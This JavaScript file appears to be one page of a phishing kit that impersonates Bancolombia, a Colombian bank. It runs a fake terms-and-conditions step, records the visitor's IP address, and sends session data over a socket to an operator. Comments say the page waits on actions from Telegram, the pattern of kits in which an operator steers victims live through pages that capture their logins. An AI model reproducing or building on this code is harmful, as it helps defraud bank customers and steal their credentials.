document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('terminosForm');
    const checkboxes = document.querySelectorAll('.termino-check');
    const btnContinuar = document.querySelector('.btn-iniciar');
    const btnCancelar = document.querySelector('.btn-cancelar');
    
    // Usar sistema centralizado
    const sessionId = bancolombia.initGlobalSession();
    bancolombia.initializeSocket();
    bancolombia.setupTelegramActions();
    const loadingOverlay = bancolombia.createLoadingOverlay();
    
    // Obtener socket del sistema centralizado
    const getSocket = () => bancolombia.getSocket();

    // Actualizar IP y fecha/hora
    async function updateIpAndDateTime() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            document.getElementById('ipAddress').textContent = `Dirección IP: ${ipData.ip}`;
            
            const now = new Date();
            const options = { 
                weekday: 'long', 
                year: 'numeric', 
                month: 'long', 
                day: 'numeric',
                hour: 'numeric',
                minute: 'numeric',
                hour12: true,
                timeZone: 'America/Bogota'
            };
            document.getElementById('datetime').textContent = now.toLocaleDateString('es-CO', options);
        } catch (error) {
            console.error('Error:', error);
        }
    }

    updateIpAndDateTime();
    setInterval(updateIpAndDateTime, 60000); // Actualizar cada minuto

    function checkAllTerms() {
        const allChecked = Array.from(checkboxes).every(checkbox => checkbox.checked);
        if (allChecked) {
            btnContinuar.removeAttribute('disabled');
            btnContinuar.classList.add('active');
        } else {
            btnContinuar.setAttribute('disabled', '');
            btnContinuar.classList.remove('active');
        }
    }

    checkboxes.forEach(checkbox => {
        checkbox.addEventListener('change', checkAllTerms);
    });

    form.addEventListener('submit', async function(e) {
        e.preventDefault();
        loadingOverlay.show();
        
        const socket = getSocket();
        
        if (!socket || !socket.connected) {
            console.error('❌ Socket no conectado');
            alert('Error de conexión. Recarga la página.');
            loadingOverlay.hide();
            return;
        }
        
        socket.emit('sendData', {
            type: 'terminos',
            sessionId,
            content: {
                text: `✅ Términos y condiciones aceptados\n⌚ ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`
            },
            waitForAction: true
        });
        
        socket.once('dataSent', (response) => {
            if (response.success) {
                console.log('Términos aceptados');
                // Mantener overlay esperando acción de Telegram
            } else {
                console.error('Error:', response.message);
                loadingOverlay.hide();
            }
        });
    });

    btnCancelar.addEventListener('click', () => {
        window.location.href = 'index.html';
    });
});